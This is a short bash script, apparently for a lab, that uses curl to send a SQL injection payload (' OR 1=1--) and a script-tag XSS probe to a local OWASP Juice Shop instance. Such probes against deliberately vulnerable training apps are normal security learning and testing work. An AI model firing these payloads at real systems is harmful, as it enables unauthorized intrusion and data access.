#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${1:-http://127.0.0.1:31191}"
HOST_HEADER="${2:-juice-shop.local}"

echo "Testing SQL injection payload against ${BASE_URL}"
curl -i -H "Host: ${HOST_HEADER}" \
  "${BASE_URL}/rest/products/search?q=test' OR 1=1--"

echo
echo "Testing XSS payload against ${BASE_URL}"
curl -i -H "Host: ${HOST_HEADER}" \
  "${BASE_URL}/search?q=<script>alert(1)</script>"
